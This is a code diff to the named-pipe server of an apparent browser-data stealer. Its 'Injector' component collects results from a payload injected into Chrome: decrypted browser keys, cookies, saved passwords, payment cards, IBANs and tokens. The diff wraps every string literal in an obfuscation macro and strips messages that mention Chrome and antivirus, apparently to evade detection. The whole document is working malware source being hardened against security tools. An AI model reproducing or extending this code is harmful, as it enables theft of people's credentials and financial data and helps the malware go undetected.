@@ -3,6 +3,7 @@
 
 #include "pipe_server.hpp"
 #include "../core/console.hpp"
+#include "../core/obfuscate.hpp"
 #include <iostream>
 #include <vector>
 #include <algorithm>
@@ -49,7 +50,7 @@ namespace Injector {
                                        1, 4096, 4096, 0, nullptr));
 
         if (!m_hPipe) {
-            throw std::runtime_error("CreateNamedPipeW failed: " + std::to_string(GetLastError()));
+            throw std::runtime_error(std::string(OBF("CreateNamedPipeW failed: ").c_str()) + std::to_string(GetLastError()));
         }
     }
 
@@ -57,7 +58,7 @@ namespace Injector {
         OVERLAPPED ov = {};
         ov.hEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
         if (!ov.hEvent)
-            throw std::runtime_error("CreateEvent failed: " + std::to_string(GetLastError()));
+            throw std::runtime_error(std::string(OBF("CreateEvent failed: ").c_str()) + std::to_string(GetLastError()));
 
         BOOL connected = ConnectNamedPipe(m_hPipe.get(), &ov);
         DWORD lastErr = GetLastError();
@@ -69,7 +70,7 @@ namespace Injector {
 
         if (lastErr != ERROR_IO_PENDING) {
             CloseHandle(ov.hEvent);
-            throw std::runtime_error("ConnectNamedPipe failed: " + std::to_string(lastErr));
+            throw std::runtime_error(std::string(OBF("ConnectNamedPipe failed: ").c_str()) + std::to_string(lastErr));
         }
 
         HANDLE waitOn[2] = { ov.hEvent, hProcess };
@@ -92,19 +93,17 @@ namespace Injector {
             DWORD code = STILL_ACTIVE;
             GetExitCodeProcess(hProcess, &code);
             throw std::runtime_error(
-                "Chrome process exited (code: " + std::to_string(code) +
-                ") before payload connected — Bootstrap may have crashed or been killed by AV");
+                std::string(OBF("Process exited (code: ").c_str()) + std::to_string(code) +
+                OBF(") before payload connected").c_str());
         }
 
-        throw std::runtime_error(
-            "Timeout: payload did not connect within 30s "
-            "(Bootstrap may have failed to resolve syscalls or map the PE)");
+        throw std::runtime_error(OBF("Timeout: payload did not connect within 30s").c_str());
     }
 
     void PipeServer::SendConfig(bool verbose, bool fingerprint, const std::filesystem::path& output) {
-        Write(verbose ? "VERBOSE_TRUE" : "VERBOSE_FALSE");
+        Write(verbose ? OBF("VERBOSE_TRUE").c_str() : OBF("VERBOSE_FALSE").c_str());
         Sleep(10);
-        Write(fingerprint ? "FINGERPRINT_TRUE" : "FINGERPRINT_FALSE");
+        Write(fingerprint ? OBF("FINGERPRINT_TRUE").c_str() : OBF("FINGERPRINT_FALSE").c_str());
         Sleep(10);
         Write(output.string());
         Sleep(10);
@@ -115,12 +114,12 @@ namespace Injector {
     void PipeServer::Write(const std::string& msg) {
         DWORD written = 0;
         if (!SyncWritePipe(m_hPipe.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &written)) {
-            throw std::runtime_error("WriteFile failed: " + std::to_string(GetLastError()));
+            throw std::runtime_error(std::string(OBF("WriteFile failed: ").c_str()) + std::to_string(GetLastError()));
         }
     }
 
     void PipeServer::ProcessMessages(bool verbose) {
-        const std::string completionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
+        const std::string completionSignal(OBF("__DLL_PIPE_COMPLETION_SIGNAL__").c_str());
         std::string accumulated;
         char buffer[4096];
         bool completed = false;
@@ -159,24 +158,24 @@ namespace Injector {
                     break;
                 }
 
-                if (msg.rfind("DEBUG:", 0) == 0) {
+                if (msg.rfind(OBF("DEBUG:").c_str(), 0) == 0) {
                     console.Debug(msg.substr(6));
                 }
-                else if (msg.rfind("PROFILE:", 0) == 0) {
+                else if (msg.rfind(OBF("PROFILE:").c_str(), 0) == 0) {
                     console.ProfileHeader(msg.substr(8));
                     m_stats.profiles++;
                 }
-                else if (msg.rfind("KEY:", 0) == 0) {
+                else if (msg.rfind(OBF("KEY:").c_str(), 0) == 0) {
                     console.KeyDecrypted(msg.substr(4));
                 }
-                else if (msg.rfind("NO_ABE:", 0) == 0) {
+                else if (msg.rfind(OBF("NO_ABE:").c_str(), 0) == 0) {
                     console.NoAbeWarning(msg.substr(7));
                     m_stats.noAbe = true;
                 }
-                else if (msg.rfind("ASTER_KEY:", 0) == 0) {
+                else if (msg.rfind(OBF("ASTER_KEY:").c_str(), 0) == 0) {
                     console.AsterKeyDecrypted(msg.substr(10));
                 }
-                else if (msg.rfind("COOKIES:", 0) == 0) {
+                else if (msg.rfind(OBF("COOKIES:").c_str(), 0) == 0) {
                     size_t sep = msg.find(':', 8);
                     if (sep != std::string::npos) {
                         int count = std::stoi(msg.substr(8, sep - 8));
@@ -186,37 +185,37 @@ namespace Injector {
                         console.ExtractionResult("Cookies", count, total);
                     }
                 }
-                else if (msg.rfind("PASSWORDS:", 0) == 0) {
+                else if (msg.rfind(OBF("PASSWORDS:").c_str(), 0) == 0) {
                     int count = std::stoi(msg.substr(10));
                     m_stats.passwords += count;
                     console.ExtractionResult("Passwords", count);
                 }
-                else if (msg.rfind("CARDS:", 0) == 0) {
+                else if (msg.rfind(OBF("CARDS:").c_str(), 0) == 0) {
                     int count = std::stoi(msg.substr(6));
                     m_stats.cards += count;
                     console.ExtractionResult("Cards", count);
                 }
-                else if (msg.rfind("IBANS:", 0) == 0) {
+                else if (msg.rfind(OBF("IBANS:").c_str(), 0) == 0) {
                     int count = std::stoi(msg.substr(6));
                     m_stats.ibans += count;
                     console.ExtractionResult("IBANs", count);
                 }
-                else if (msg.rfind("TOKENS:", 0) == 0) {
+                else if (msg.rfind(OBF("TOKENS:").c_str(), 0) == 0) {
                     int count = std::stoi(msg.substr(7));
                     m_stats.tokens += count;
                     console.ExtractionResult("Tokens", count);
                 }
-                else if (msg.rfind("DATA:", 0) == 0) {
+                else if (msg.rfind(OBF("DATA:").c_str(), 0) == 0) {
                     std::string data = msg.substr(5);
                     size_t sep = data.find('|');
                     if (sep != std::string::npos) {
                         console.DataRow(data.substr(0, sep), data.substr(sep + 1));
                     }
                 }
-                else if (msg.rfind("[-]", 0) == 0) {
+                else if (msg.rfind(OBF("[-]").c_str(), 0) == 0) {
                     console.Error(msg.substr(4));
                 }
-                else if (msg.rfind("[!]", 0) == 0) {
+                else if (msg.rfind(OBF("[!]").c_str(), 0) == 0) {
                     console.Warn(msg.substr(4));
                 }
                 else {
